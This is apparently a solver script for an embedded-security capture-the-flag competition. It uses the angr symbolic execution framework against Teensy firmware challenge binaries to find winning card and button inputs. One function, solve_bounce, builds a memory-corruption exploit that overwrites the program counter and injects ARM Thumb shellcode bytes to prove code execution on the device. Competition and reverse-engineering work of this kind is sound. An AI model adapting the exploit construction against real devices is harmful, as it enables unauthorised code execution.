#!/usr/bin/env python3
print("Importing angr...")

import angr
import re
import argparse
import sys
import time

from struct import pack
from IPython import embed

import multiprocessing
from multiprocessing import Pool
from binascii import unhexlify

WHITE_CARD_START_ADDR = 0x7fff0000-0xf
WHITE_CARD_SZ = 16*64
WHITE_CARD_END_ADDR = WHITE_CARD_START_ADDR + WHITE_CARD_SZ
BUTTON_OFFSET = WHITE_CARD_START_ADDR + WHITE_CARD_SZ + 48

class ESCAngr(object):
    def __init__(self, path):
        self.proj = angr.Project(path)
        self.obj = self.proj.loader.main_object
        self.sym = None

    def _set_start_symbol(self, function):
        self.sym = self.obj.symbols_by_name[function]
        print("Function set to " + self.sym.demangled_name)

    def print_card_offsets(self, state):
        expr = state.inspect.mem_read_address
        expr_val = state.solver.eval(expr)

        if expr_val >= WHITE_CARD_START_ADDR and expr_val <= WHITE_CARD_END_ADDR:
            offset = expr_val - WHITE_CARD_START_ADDR
            print("CARD READ: %x (%s)" % (offset, str(expr)))
        elif expr_val == BUTTON_OFFSET:
            print("!!!!!! BUTTON READ !!!!!!")

    def hook_card_read(self, state):
        state.inspect.b('mem_read', when=angr.BP_AFTER, action=self.print_card_offsets)

    def solve_stairs(self):
        self._set_start_symbol("_Z11challenge_36packet")
        addr = self.sym.linked_addr

        for i in self.obj.symbols:
            if i.demangled_name.startswith("Print::print"):
                self.proj.hook(i.linked_addr, self.print_hook)
                print("Hooked %s (0x%08x)" % (i.demangled_name, i.linked_addr))

        st = self.proj.factory.blank_state()
        st.regs.pc = addr
        st.options.add('SYMBOL_FILL_UNCONSTRAINED_MEMORY')
        self.hook_card_read(st)

        mgr = self.proj.factory.simgr(st)
        mgr.use_technique(angr.exploration_techniques.Explorer(find=[0xf60,0xf61], avoid=[0xf84,0xf85,0xf38,0xf39]))

        mgr.run()

        if bool(mgr.errored):
            mgr.errored[0].reraise()

        s = mgr.found[0]
        mgr_final = self.proj.factory.simgr(s)
        mgr_final.run()

        self.print_table(s)

    def solve_cafe(self):
        self._set_start_symbol("_Z11challenge_26packet")
        addr = self.sym.linked_addr

        self._hook_prints()
        st = self._get_start_state(addr, ['SYMBOL_FILL_UNCONSTRAINED_MEMORY'])

        mgr = self.proj.factory.simgr(st)
        mgr.use_technique(angr.exploration_techniques.Veritesting())

        mgr.run()

        if not mgr.unconstrained:
            print("Analysis failed")
            return

        s = mgr.unconstrained[0]

        fixed = 'solved challenge cafe abcdefg'

        # address of challResult
        challResult = 0x1fffa140

        for i in range(len(fixed)):
            s.solver.add(s.memory.load(challResult+i, 1) == ord(fixed[i]))

        strout = self.read_string(s, challResult)
        print("ChallResult: " +  repr(strout))

        self.print_table(s)
        embed()

    def solve_closet(self):
        self._set_start_symbol("_Z11challenge_16packet")
        addr = self.sym.linked_addr

        self._hook_prints()
        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY', angr.options.LAZY_SOLVES])

        # this key is already loaded into memory
        key = b"ESC19-rocks!"

        for i in range(0xc):
            st.memory.store(WHITE_CARD_START_ADDR+0x5c+i, pack("<b", 0x18+i))

        st.inspect.b('instruction', when=angr.BP_BEFORE, instruction=0x8b9, action=lambda s: print(s.regs.r3))

        mgr = self.proj.factory.simgr(st)
        mgr.use_technique(angr.exploration_techniques.Explorer(find=[0x8ee,0x8ef], avoid=[0x912,0x913,0x8c6,0x8c7]))

        mgr.run()

        if not mgr.found:
            print("Analysis failed")
            return

        s = mgr.found[0]
        self.print_table(s)

    def exec_once_lounge(self, state):
        print(state)
        mgr = self.proj.factory.simgr(state)
        mgr.use_technique(angr.exploration_techniques.Explorer(find=[0xc20,0xc21], avoid=[0xc50,0xc51]))
        mgr.run(n=20)
        print("DONE " + str(mgr))
        return [mgr.active, mgr.found]

    def solve_lounge(self):
        self._set_start_symbol("_Z11challenge_06packet")
        addr = self.sym.linked_addr

        self._hook_prints()
        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY'])

        # 2 bytes of input
        st.memory.store(WHITE_CARD_START_ADDR+0x4c, st.solver.BVS("input", 16))

        mgr = self.proj.factory.simgr(st)
        mgr.use_technique(angr.exploration_techniques.Explorer(find=[0xc20,0xc21], avoid=[0xc50,0xc51]))

        # get some initial paths
        mgr.run(n=4)

        def gather_results(omgr):
            mgr.active += omgr[0]
            mgr.found += omgr[1]

        pool = Pool(processes=multiprocessing.cpu_count())

        while not mgr.found:
            print(mgr)

            if len(mgr.active) == 0:
                time.sleep(1)
                continue

            active_st = mgr.active.copy()
            mgr.drop(stash='active')

            print("Distributing %d states" % len(active_st))

            for a in active_st:
                pool.apply_async(self.exec_once_lounge, args=(a,), callback=gather_results)

        embed()

        if bool(mgr.errored):
            mgr.errored[0].reraise()

        if not mgr.found:
            print("Analysis failed")
            return

        s = mgr.found[0]
        mgr_final = self.proj.factory.simgr(s)
        mgr_final.run()

        self.print_table(s)

    def print_table(self, state):
        print(self._gen_table(state))

    def _gen_table(self, state):
        table = state.solver.eval(state.memory.load(WHITE_CARD_START_ADDR, WHITE_CARD_SZ), cast_to=bytes)
        buttons = state.solver.eval(state.memory.load(BUTTON_OFFSET, 1), cast_to=int)

        arr = []
        for i in range(64):
            arr += [[c for c in table[i*16:(i+1)*16]]]

        output = []
        output += ["#     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f"]
        output += ["p = ["]

        for i, row in enumerate(arr):
            eol = "," if i < 63 else "]"
            row = ", ".join([(("0x%02x" % x) if x != 0 else "0") for x in row])
            output += ["     [" + str(row) + ("]%s # %x" % (eol, i))]


        output += ["a = 0x%x" % ((buttons >> 4) & 0xf)]
        output += ["b = 0x%x" % (buttons & 0xf)]

        return "\n".join(output)

    def read_string(self, state, addr):
        val = None
        strout = bytes()
        i = 0
        while True:
            val = state.mem[addr+i].char.concrete
            i += 1
            if ord(val) == 0:
                break
            strout += val

        return strout

    def print_hook(self, state):
        s = self.obj.loader.find_symbol(state.solver.eval(state.regs.pc))
        match = re.search(r':([a-zA-Z]*)\(([^)]*)\)', s.demangled_name)
        fn = match.group(1)
        ty = match.group(2)
        name = "Print::%s(%s) - " % (fn, ty)

        ARG1 = state.regs.r1

        if fn == "print":
            print(name, "UNHANDLED")
        elif fn == "println":
            if ty == "char const*":
                strout = self.read_string(state, ARG1)
                print(name, repr(strout))
            elif ty == "int":
                print(name, state.solver.eval(ARG1))
            else:
                print(name, "UNHANDLED")
        elif fn == "printf":
            fmt = state.regs.r1
            ARGV = [state.regs.r2, state.regs.r3, state.regs.r4]
            fmt_s = self.read_string(state, fmt)
            fmt_s.decode("ascii")

            print(name, fmt_s, tuple(ARGV))
        else:
            print(name, "UNHANDLED")

        state.regs.pc = state.regs.lr

    def solve_dance(self):
        self._set_start_symbol("_Z11challenge_56packet")
        addr = self.sym.linked_addr

        for i in self.obj.symbols:
            if i.demangled_name.startswith("Print::print"):
                self.proj.hook(i.linked_addr, self.print_hook)
                print("Hooked %s (0x%08x)" % (i.demangled_name, i.linked_addr))

        st = self.proj.factory.blank_state()
        st.regs.pc = addr

        # Nothing should be unconstrained as we assign it
        st.memory.store(WHITE_CARD_START_ADDR+0x93, "password")
        self.hook_card_read(st)

        mgr = self.proj.factory.simgr(st)

        mgr.run()

        if not mgr.unconstrained:
            print("Analysis failed")
            return

        self.print_table(mgr.unconstrained[0])

    def solve_code(self):
        self._set_start_symbol("_Z11challenge_66packet")
        addr = self.sym.linked_addr

        for i in self.obj.symbols:
            if i.demangled_name.startswith("Print::print"):
                self.proj.hook(i.linked_addr, self.print_hook)
                print("Hooked %s (0x%08x)" % (i.demangled_name, i.linked_addr))

        st = self.proj.factory.blank_state()
        st.regs.r0 = 0
        st.regs.r1 = 0
        st.regs.r2 = 0
        st.regs.r3 = 0
        st.regs.r4 = 0
        st.regs.r5 = 0
        st.regs.r6 = 0
        st.regs.r7 = 0
        st.regs.r8 = 0
        st.regs.r9 = 0
        st.regs.r10 = 0
        st.regs.r11 = 0
        st.regs.r12 = 0
        #st.options |= set(['SYMBOL_FILL_UNCONSTRAINED_MEMORY'])
        st.regs.pc = addr
        st.memory.store(WHITE_CARD_START_ADDR+0x9b, "L")

        # Nothing should be unconstrained as we assign it
        #st.memory.store(WHITE_CARD_START_ADDR+0x93, "password")
        self.hook_card_read(st)

        mgr = self.proj.factory.simgr(st)

        mgr.run()

        if not mgr.unconstrained:
            print("Analysis failed")
            return

        self.print_table(mgr.unconstrained[0])

    def exec_once(self, state):
        mgr = self.proj.factory.simgr(state)
        mgr.use_technique(angr.exploration_techniques.Explorer(find=[0x18fe, 0x18ff], avoid=self.filter_fun))
        mgr.run(n=20)
        print("DONE " + str(mgr))
        return [mgr.active, mgr.found]

    def filter_fun(self, state):
        target = bytes("solved challenge mobile abcdefg\x00", "ascii")
        #loop_count =state.solver.eval(state.memory.load(state.regs.r7-0x34, 4)) #state.solver.eval(state.mem[state.regs.r7-0x34].uint)
        loop_count = state.mem[state.regs.r7+0xb4].uint32_t
        res = state.solver.eval(state.memory.load(0x7ffeff18, len(target)), cast_to=bytes)
        #print(loop_count)
        return res != target

    def solve_mobile(self):
        self._set_start_symbol("_Z11challenge_46packet")
        addr = self.sym.linked_addr

        self._hook_prints()

        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY']) 

        target = bytes("solved challenge mobile abcdefg\x00", "ascii")
        solution = [0x11, 0x10, 0x33, 0x01, 0x00, 0x44, 0x40, 0x44, 0x40, 0x22, 0x05, 0x50, 0x30, 0x22, 0x01]
        solution = b"".join(pack("B", x) for x in solution)

        print(solution)
        st.memory.store(WHITE_CARD_START_ADDR+0x84, solution)


        mgr = self.proj.factory.simgr(st)

        mgr.run()

        if not mgr.unconstrained:
            print("Analysis failed")
            return

        print(self.read_string(mgr.unconstrained[0], self.obj.symbols_by_name['challHash'].linked_addr))

        self.print_table(mgr.unconstrained[0])

    def solve_blue(self):
        self._set_start_symbol("_Z11challenge_76packet")
        addr = self.sym.linked_addr

        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY']) 
        st.memory.store(st.regs.sp+0x200, b"AAAABBBB")
        st.memory.store(st.regs.sp+0x300, b"\x00"*0x20)

        blake_256_init = self.proj.factory.callable(self.obj.symbols_by_name["blake_256_init"].linked_addr, concrete_only=True, base_state=st)
        blake_256_init(st.regs.sp)

        blake_256_update = self.proj.factory.callable(self.obj.symbols_by_name["blake_256_update"].linked_addr, concrete_only=True, base_state=blake_256_init.result_state)
        blake_256_update(st.regs.sp, st.regs.sp+0x200, 8)

        blake_256_final = self.proj.factory.callable(self.obj.symbols_by_name["blake_256_final"].linked_addr, concrete_only=True, base_state=blake_256_update.result_state)
        blake_256_final(st.regs.sp, st.regs.sp+0x300)

        embed()

    def solve_break(self):
        self._set_start_symbol("_Z12challenge_106packet")
        addr = self.sym.linked_addr

        self._hook_prints()

        st = self._get_start_state(addr, ['SYMBOL_FILL_UNCONSTRAINED_MEMORY'])

        mgr = self.proj.factory.simgr(st)
        mgr.explore(find=[0x11b9])

        if not mgr.found:
            print("Analysis failed")
            return

        self.print_table(mgr.found[0])

    def _get_start_state(self, addr, options):
        assert type(options) is list

        st = self.proj.factory.blank_state()
        st.regs.r0 = st.regs.r1 = st.regs.r2 = st.regs.r3 = 0
        st.regs.r4 = st.regs.r5 = st.regs.r6 = st.regs.r7 = 0
        st.regs.r8 = st.regs.r9 = st.regs.r10 = st.regs.r11 = 0
        st.regs.r12 = 0
        st.options |= set(options)
        st.regs.pc = addr

        self.hook_card_read(st)

        return st

    def no_op(s):
        print("delay() called")
        s.regs.pc = s.regs.lr

    def putchar(s):
        print("PUTCH %02x", s.regs.r0)
        s.regs.pc = s.regs.lr

    def _hook_prints(self):

        for i in self.obj.symbols:
            if i.demangled_name.startswith("Print::print"):
                self.proj.hook(i.linked_addr, self.print_hook)
                print("Hooked %s (0x%08x)" % (i.demangled_name, i.linked_addr))
            elif i.demangled_name.startswith("delay"):
                self.proj.hook(i.linked_addr, ESCAngr.no_op)
                print("Hooked %s (0x%08x)" % (i.demangled_name, i.linked_addr))
            elif i.demangled_name.startswith("usb_serial_putchar"):
                self.proj.hook(i.linked_addr, ESCAngr.putchar)
                print("Hooked %s (0x%08x)" % (i.demangled_name, i.linked_addr))

    def solve_recess(self):
        self._set_start_symbol("_Z12challenge_116packet")
        addr = self.sym.linked_addr

        self._hook_prints()

        st = self._get_start_state(addr, ['SYMBOL_FILL_UNCONSTRAINED_MEMORY']) 
        mgr = self.proj.factory.simgr(st)
        mgr.explore(find=[0x1291])

        if not mgr.found:
            print("Analysis failed")
            return

        self.print_table(mgr.found[0])

    def solve_game(self):
        self._set_start_symbol("_Z11challenge_96packet")
        addr = self.sym.linked_addr

        self._hook_prints()

        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY']) 
        mgr = self.proj.factory.simgr(st)
        #mgr.use_technique(angr.exploration_techniques.Veritesting())
        st.memory.store(WHITE_CARD_START_ADDR+0x9c, bytes("\x02\x10\x22", 'ascii'))
        mgr.explore(find=[0x107d, 0x107c], avoid=[0xfee,0xfef])
        embed()

        if not mgr.found:
            print("Analysis failed")
            return

        self.print_table(mgr.found[0])
        strout = self.read_string(st, st.regs.r1)


    def solve_uno(self):
        prog = [30, 64, -1, 64, -1, -1, 31, 1, -1, 31, 3, -1, 33, 33, 15, 32, 33, 18, 33, 34, 21, 0, 34, 27, 34, 34, 0, -1, -1, -1, 3, -1, 95, 0, 0]
        prog_packed = b"".join([pack("<b", x) for x in prog])
        print(prog_packed)

        self._set_start_symbol("_Z11challenge_86packet")
        addr = self.sym.linked_addr

        self._hook_prints()

        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY']) 
        mgr = self.proj.factory.simgr(st)

        st.memory.store(WHITE_CARD_START_ADDR, b"\x00"*WHITE_CARD_SZ)
        st.memory.store(WHITE_CARD_START_ADDR+0x200, prog_packed)

        # Uncomment to see progress of bytes written
        #st.inspect.b('instruction', when=angr.BP_BEFORE, instruction=0xe81, action=lambda s: embed())

        mgr.explore(find=[0xee3])

        if not mgr.found:
            print("Analysis failed")
            return

        challHash = self.read_string(mgr.found[0], 0x1fffa54c)

        print(challHash)
        if challHash != b'solved challenge uno abcdefghij':
            print("Chalhash is wrong!")
            return

        self.print_table(mgr.found[0])

    def solve_bounce(self):
        self._set_start_symbol("_Z11challenge_86packet")
        addr = self.sym.linked_addr

        self._hook_prints()

        st = self._get_start_state(addr, [])
        # gets overwritten anyway
        st.regs.lr = 0x8d0

        mgr = self.proj.factory.simgr(st)

        mgr.use_technique(angr.exploration_techniques.Explorer(find=[0x876, 0x877], avoid=[0x874,0x875]))
        st.memory.store(WHITE_CARD_START_ADDR, b"\x00"*WHITE_CARD_SZ)

        # Just returning right towards the solve function
        #target_pc = self.obj.symbols_by_name["_Z17fillChallengeHashv"].linked_addr

        # DO NOT CHANGE
        target_pc = 0x1fff976d + 0x110 # ON DEVICE CODE AREA
        payload_offset = 0x111
        print("[+] Exploit target PC %08x" % target_pc)

        stage1 = b"\x00"*11 + bytes(chr(target_pc & 0xff), 'ascii') + pack("<I", 12) + b"\x00\x00\x00\x00" + pack("<I", target_pc)

        st.memory.store(WHITE_CARD_START_ADDR, b"\x00"*WHITE_CARD_SZ)

        # for each bit that is set, read a byte from the payload (24 bytes)
        st.memory.store(WHITE_CARD_START_ADDR+0x100, b"\xff"*3)
        st.memory.store(WHITE_CARD_START_ADDR+0xc0, stage1)

        NOP = b"\x00\xbf"

        # prove code exec: still execute the challenge function with code!
        # Starts executing from the first NOP
        full_exec_demo = NOP*0x1 + unhexlify("07 20 1d 21 08 22 90 40 08 43 86 46 70 47".replace(" ",""))
        full_exec_demo = NOP*0x1 + open('D-bounce-11/full_exec.bin', 'rb').read()

        #payload3 = NOP*0x20 + unhexlify(" 04 20 b5 21 08 22 90 40 08 43 07 1c 03 a6 30 68 03 a1 b8 47 f3 e7 00 00 00 00 34 8e ff 1f 48 41 43 4b 45 44 00".replace(" ",""))

        #payload4 = NOP*0x20 + unhexlify(" 07 20 4b 21 08 22 90 40 08 43 07 1c 02 a1 38 47 f6 e7 00 00 00 00 48 41 43 4b 45 44 00".replace(" ", ""))
        #payload4 = NOP*0x18 + unhexlify(" 07 20 1d 21 08 22 90 40 08 43 06 1c 04 20 b5 21 08 22 90 40 08 43 07 1c 4f 20 90 40 3f 24 20 43 48 21 00 bf b6 46 70 47".replace(" ", ""))
        #payload5 = NOP*0x18 + unhexlify(" 08 a0 06 88 06 a0 07 88 07 a0 00 68 06 a1 00 bf b8 47 b0 47 00 bf fe e7 00 00 00000000 b5 04  00 00 1d 07 34 8e ff 1f 48 41 43 4b 45 44 00".replace(" ", ""))

        payload = full_exec_demo

        st.memory.store(WHITE_CARD_START_ADDR+payload_offset, payload)

        st.memory.store(0x1fff976d, b"\x00"*WHITE_CARD_SZ)
        st.memory.store(0x1fff976d+payload_offset, payload)

        for i in range(64):
            if i in [0, 1, 2, 3] or (i > 6 and ((i - 7) % 4 == 0)):
                st.memory.store(WHITE_CARD_START_ADDR+i*16, b"\x00"*16)
                st.memory.store(0x1fff976d+i*16, b"\x00"*16)

        st.memory.store(BUTTON_OFFSET, st.solver.BVS('button', 8))

        mgr.run()

        if not mgr.found:
            print("Analysis failed")
            return

        s = mgr.found[0]
        n = s.step()[0]

        print(n)
        if n.solver.eval(n.regs.pc) != target_pc:
            print("Wrong target PC!")
            return

        self.print_table(n)
        mgr2 = self.proj.factory.simgr(s)
        mgr2.run(n=1)
        print(mgr2)
        embed()

    def solve_caesar(self):
        self._set_start_symbol("_Z12challenge_136packet")
        addr = self.sym.linked_addr

        self._hook_prints()

        st = self._get_start_state(addr, ['SYMBOL_FILL_UNCONSTRAINED_MEMORY']) 
        mgr = self.proj.factory.simgr(st)
        #mgr.use_technique(angr.exploration_techniques.Veritesting())

        for i in range(4):
            st.memory.store(WHITE_CARD_START_ADDR+0x1a0+i, st.solver.BVS("input%d" % i, 8))

        st.memory.store(BUTTON_OFFSET, st.solver.BVS("button", 8))

        #mgr.explore(find=[0x1b8d, 0x1b8c], avoid=[0x1b4f, 0x1b01, 0x1aaf])
        embed()

    def solve_steel(self):
        self._set_start_symbol("_Z12challenge_126packet")
        addr = self.sym.linked_addr

        self._hook_prints()

        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY']) 
        #st.inspect.b('instruction', when=angr.BP_BEFORE, instruction=0x1785, action=lambda s: embed())

        st.memory.store(WHITE_CARD_START_ADDR+0x191, st.solver.BVS('input', 8*3))

        mgr = self.proj.factory.simgr(st)
        mgr.explore(find=[0x1796+1])

        s = mgr.found[0]

        s.solver.add(s.memory.load(s.regs.r7+0x8c, 1) == ord(';'))

        self.print_table(s)

        return

        # the below was used for testing to see why this MD5 was different from other MD5s
        st.memory.store(st.regs.sp+0x200, b"A")
        st.memory.store(st.regs.sp+0x300, b"\x00"*0x20)

        hash_create = self.proj.factory.callable(self.obj.symbols_by_name["_ZN4H45HC1Ev"].linked_addr, concrete_only=True, base_state=st)
        hash_create(st.regs.sp)

        hash_init = self.proj.factory.callable(self.obj.symbols_by_name["_ZN4H45H4InitEv"].linked_addr, concrete_only=True, base_state=hash_create.result_state)
        hash_init(st.regs.sp)

        hash_update = self.proj.factory.callable(self.obj.symbols_by_name["_ZN4H45H6UpdateEPhj"].linked_addr, concrete_only=True, base_state=hash_init.result_state)
        hash_update(st.regs.sp, st.regs.sp+0x200, 1)

        hash_final = self.proj.factory.callable(self.obj.symbols_by_name["_ZN4H45H5FinalEv"].linked_addr, concrete_only=True, base_state=hash_update.result_state)
        hash_final(st.regs.sp)
        final = hash_final.result_state.memory.load(hash_final.result_state.regs.sp+0x68, 0x20)
        print(final)

        hash_update2 = self.proj.factory.callable(self.obj.symbols_by_name["_ZN4H45H6UpdateEPhj"].linked_addr, concrete_only=True, base_state=hash_final.result_state)
        hash_update2(hash_final.result_state.regs.sp, hash_final.result_state.regs.sp+0x68, 0x20)

        hash_final2 = self.proj.factory.callable(self.obj.symbols_by_name["_ZN4H45H5FinalEv"].linked_addr, concrete_only=True, base_state=hash_update2.result_state)
        hash_final2(st.regs.sp)
        final2 = hash_final2.result_state.memory.load(hash_final2.result_state.regs.sp+0x68, 0x20)
        print(final2)
        embed()

    def solve_spiral(self):
        self._set_start_symbol("_Z12challenge_146packet")
        addr = self.sym.linked_addr

        self._hook_prints()

        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY']) 
        mgr = self.proj.factory.simgr(st)

        st.memory.store(WHITE_CARD_START_ADDR+0x18d, st.solver.BVS("input", 8*4))
        mgr.explore(find=[0x1e05], avoid=[0x1e2b])

        s = mgr.found[0]
        self.print_table(s)

    def solve_tower(self):
        self._set_start_symbol("_Z12challenge_156packet")
        addr = self.sym.linked_addr

        self._hook_prints()

        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY']) 
        st.memory.store(st.regs.sp+0x200, b"AAAABBBB")
        st.memory.store(st.regs.sp+0x300, b"\x00"*0x20)

        blake_256_init = self.proj.factory.callable(self.obj.symbols_by_name["blake_256_init"].linked_addr, concrete_only=True, base_state=st)
        blake_256_init(st.regs.sp)

        blake_256_update = self.proj.factory.callable(self.obj.symbols_by_name["blake_256_update"].linked_addr, concrete_only=True, base_state=blake_256_init.result_state)
        blake_256_update(st.regs.sp, st.regs.sp+0x200, 8)

        blake_256_final = self.proj.factory.callable(self.obj.symbols_by_name["blake_256_final"].linked_addr, concrete_only=True, base_state=blake_256_update.result_state)
        blake_256_final(st.regs.sp, st.regs.sp+0x300)

        embed()

    def solve_spire(self):
        self._set_start_symbol("_Z12challenge_176packet")
        addr = self.sym.linked_addr

        self._hook_prints()

        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY']) 

        st.memory.store(WHITE_CARD_START_ADDR+0x280, pack("<I", 0) + pack("<i", -(4*3)))
        st.memory.store(WHITE_CARD_START_ADDR+0x36f, pack("B", 1))
        st.memory.store(WHITE_CARD_START_ADDR+0x340, pack("B", 1))
        st.memory.store(WHITE_CARD_START_ADDR+0x2cf, pack("B", 0))
        st.memory.store(WHITE_CARD_START_ADDR+0x2c3, pack("<IIIB", 1, 0, 0x1fffa140, 0))

        mgr = self.proj.factory.simgr(st)
        mgr.run()

        print(self.read_string(mgr.unconstrained[0], 0x1fffa140))

        self.print_table(mgr.unconstrained[0])


    def solve_live(self):
        self._set_start_symbol("_Z14challenge_live6packet")
        addr = self.sym.linked_addr

        self._hook_prints()

        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY']) 

        
        mgr = self.proj.factory.simgr(st)
        mgr.use_technique(angr.exploration_techniques.Explorer(find=[0x99f], avoid=[0x9c3,0x8c9,0x911,0x984]))

        for dat in [0x14, 0x53, 0x71, 0xd4, 0xe1, 0xc3, 0xd1, 0xe2, 0xf4]:
            st.memory.store(WHITE_CARD_START_ADDR+0x380, chr(dat))

        def fixup(s):
            offsets = [1,5,7,8,10,12,13,14,15]
            base = 0x1fff8800
            print("FIXUP")
            for i,o in enumerate(offsets):
                bvs = s.solver.BVS("input%d" % o, 8)
                s.memory.store(base+o, bvs)
                s.memory.store(WHITE_CARD_START_ADDR+0x380+i, bvs)

        #st.inspect.b('instruction', when=angr.BP_BEFORE, instruction=0x889, action=lambda s: fixup(s))

        mgr.run()
        print(mgr)
        embed()


challenges = {
    "A" : ["stairs", "cafe", "closet", "lounge"],
    "B" : ["dance", "code", "mobile", "blue"],
    "C" : ["uno", "break", "recess", "game"],
    "D" : ["bounce"],
    "E" : ["steel", "caesar", "spiral", "tower"],
    "F" : ["spire"],
    "G" : ["live"],
}

def main():
    choices = []
    for k, v in challenges.items():
        for vv in v:
            choices += [k + "-" + vv]

    choices = sorted(choices)

    parser = argparse.ArgumentParser()
    parser.add_argument('challenge', choices=choices)

    args = parser.parse_args()
    chalname = args.challenge
    tokens = chalname.split("-")

    chset = tokens[0]
    name = tokens[1]

    if chset in ["A", "B", "C", "D", "E", "F", "G"]:
        if chset == "G":
            esc = ESCAngr("G/TeensyLiveChallengeG.ino.elf")
        else:
            esc = ESCAngr(chset + "/TeensyChallengeSet" + chset + ".ino.elf")
        
        challs = challenges[chset]

        if name not in challs:
            print("Challenge name invalid! Needed: " + str(challs))
            sys.exit(1)

        func_name = "solve_" + name

        if hasattr(esc, func_name):
            print("Calling " + func_name)

            # call the solver
            getattr(esc, func_name)()
    else:
        print("Challenge set not supported")
        sys.exit(1)

if __name__ == "__main__":
    main()
